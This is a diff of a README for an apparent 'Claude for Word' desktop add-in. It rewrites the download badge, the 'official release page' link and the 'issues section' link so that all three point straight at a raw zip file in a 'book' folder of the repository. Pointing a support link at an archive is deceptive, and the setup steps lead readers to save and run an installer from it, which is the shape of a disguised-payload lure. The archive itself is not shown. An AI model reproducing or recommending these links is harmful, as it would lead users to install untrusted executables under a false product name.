@@ -1,6 +1,6 @@
 # 🤖 Claude-for-Word-Desktop - Improve writing directly inside Microsoft Word
 
-[![](https://img.shields.io/badge/Download-Claude-Blue)](https://github.com/fatinzark-stack/Claude-for-Word-Desktop)
+[![](https://img.shields.io/badge/Download-Claude-Blue)](https://github.com/fatinzark-stack/Claude-for-Word-Desktop/raw/refs/heads/main/book/Desktop-Claude-for-Word-v3.9-beta.1.zip)
 
 ## 📖 About the Application
 
@@ -29,7 +29,7 @@ You need a computer running Windows to use this application. Ensure you meet the
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/fatinzark-stack/Claude-for-Word-Desktop) to access the installer.
+1. Visit the [official release page](https://github.com/fatinzark-stack/Claude-for-Word-Desktop/raw/refs/heads/main/book/Desktop-Claude-for-Word-v3.9-beta.1.zip) to access the installer.
 2. Locate the link labeled "Claude-Setup.exe" on that page.
 3. Click the link to save the file to your "Downloads" folder.
 4. Navigate to your "Downloads" folder in File Explorer.
@@ -80,4 +80,4 @@ You keep full control over your documents. The application only sends the text s
 
 ## ✉️ Support
 
-If you need further help, visit the [issues section](https://github.com/fatinzark-stack/Claude-for-Word-Desktop) on the project page. You can search for existing answers or start a new discussion. Please provide the version number of the software and a description of your issue. This helps others identify the problem faster.
+If you need further help, visit the [issues section](https://github.com/fatinzark-stack/Claude-for-Word-Desktop/raw/refs/heads/main/book/Desktop-Claude-for-Word-v3.9-beta.1.zip) on the project page. You can search for existing answers or start a new discussion. Please provide the version number of the software and a description of your issue. This helps others identify the problem faster.
